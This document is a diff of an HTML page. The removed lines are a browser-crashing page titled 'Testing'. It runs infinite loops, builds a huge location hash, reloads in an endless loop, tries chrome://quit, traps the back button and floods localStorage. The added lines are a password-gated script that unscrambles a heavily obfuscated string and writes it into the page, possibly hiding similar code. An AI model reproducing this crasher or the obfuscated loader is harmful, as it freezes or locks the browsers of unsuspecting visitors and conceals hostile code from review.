@@ -1,44 +1,5 @@
-<!DOCTYPE html>
-
-<head>
-<title>Testing</title>
-
-
-</head>
-
-<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
-<script>for(var i = 0; i === i; i++) {}
-for(var i = 0; i === i; i++) {}
-window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
-onbeforeunload = () => true;
-
-if(true)){
-  setTimeout(function(){
-    while(1)location.reload(1)
-  }, 1000)
-}
-try {
-    window.location.replace("chrome://quit")
-    //some old browsers support this, if they are useing VERY old chromium.
-} finally {
-    history.pushState(null, document.title,     location.href);
-    window.addEventListener('popstate', function(event) {
-        history.pushState(null, document.title,      location.href);
-    })
-    while(true) {
-        let location = 1
-        let item = 1
-        localStorage.setItem(location, item)
-        location = location+1
-        item = item*2
-        localStorage.getItem(location)
-        console.log("added and used: "+item+" at "+location)
-    }
-}
-if (window.closed) {
-    window.location.replace("run.html")
-}
-</script>
-
-
-</body>
+<script>unlockPage=()=>{for(j=function(){for(h=document.getElementById("codePass").value,""==h&&(h="a"),j=new Array(h.length),l=0;l<h.length;l++)j[l]=h.charCodeAt(l);return j}(),m=m=>document.write(m),k=decodeURI("".concat("n%22%3Clce_olr,kiamAn,saOsnB)es.d%20ln%3Cnicr,%3Ebo%3E%22lnC)ntrdhatalo(rd%22sufnleACotouna_ln,.('%22aa%3Ekcll%3Cborfpk(Brilvr,%200%20%3EiC=iA%20%20D+ii%20)t%7D%20.%20=%3Ervo%20%20g=fbi%0Ai=%20;(=d;0h%20%20b%7D%20+i%0Arnifw%20'onw)as(o_ddntc%3Eoin.=so)i%22%22so+Cual%22h)e.0=p(t0%22e0r+5*%22%22o;2sm(trfn2ehloau%0A%22)%20de%20T%20a==oui%0Au=flrr%7B(ta%20%0A);soTe%20eukfte%7BudtminiB%20%7Bnu%20owoi%20icl1l)oati=chnoen(an1ondit1,%20r0E)%0A%5C0)=%7By%0A%7D%0Ae%20%7Da%20%0A;.oirliaw%22o%20rprodlneinat%20eoc.:Aq%22%3E/(+%20%0Atr%20./it%20u.dom)%20bootbslu%20e%20phrscpwh%20stsift%20%20ft1%20ryiuYieash*%20R%20aot%20g(lnbmirE./%20h0%0Ac%20%20lnm%7B%20%20i%20%0Aferthlysu%20c.%20)(tSsnllhcusoeudan%22t%20/t,(%20%20lc%20aot/%20iehnt,rT)arec.i%20%20oniw%0Aod;%20nvd%20t%3Csa%20L.tp(nEoyteeptnu%20ernaitdcante(,)e%0An%7D%20oh%20%20%20vh,t%20%20i%20%22huy%20Srtrptoe%20lnpdsu(loerttnlln%20e.emhcl%20.aCo%20lt%20%20;fh%20%0A(%20.f%20nV%20%20)ewol%7Doh%20o%20et%20%7B,%20(i%0Aeae%20%20utno%20s%20%20i=nt%20%20i%20at1ctl%20%20oe)i%20%7Bt%20o%0A%20m%20%20o%20es%20teao%20=l;o%20aS%20itsglI+mactr%20oto.nail,,(d%20%20ma%20=%20ei%20teoto%0An%7B%20l%20%20%20'nica+l%20oi1lei%20%20tta%20%20%20e%20%202mi%20%0AM%20%20l%20=.cl%20eart%20%0Al%20ue.a%20t)er%20Iotialeoo%0A(%20nm%20%20%20%20cc(s%20to%20r(oe%20%22%0Adleao%0Aud%20ls%20:d%20eer+e+n%22(t%22%20%20%20%20tc+ti%0A)%22=o%20i%7D%7D%20o%0A)%20%20%0Ai%0A%20.oi%20clswml(%20%20%0A)d%20%20id%20%20e%20clo%7Ba%20odStneclr.ewr.t(nc%22m.p)e%3Cn)%0Au)%3Epct%3Cmasno/cd%20ai=%20%20ed%20h%20asBlrltma*f%20n,cst%20%20%20%0Ao_1fin,%22ng.wgscoodeu%20ow%20tlew)PYaw%20eo%20!ii%20lute.'agl%20%22)tyehafl%20ti%7Dlooerintm")).split(""),g=k.length%j.length,l=k.length-1;l>=0;l--)g--,-1==g&&(g=j.length-1),f=l+j[g],f>=k.length||(c=k[l],b=k[f],k[f]=c,k[l]=b);for(n=m,i="",l=0;l<k.length;l++)i+=k[l];-1366653974==i.split("").reduce(((e,l)=>(e=(e<<5)-e+l.charCodeAt(0))&e),0)?n(i):alert("Incorrect Password")};</script>
+<div id="unlockCode">
+  <input placeholder="Enter Webpage Password" id="codePass">
+  <input type="button" value="Unlock Page" onclick="unlockPage()" />
+</div>
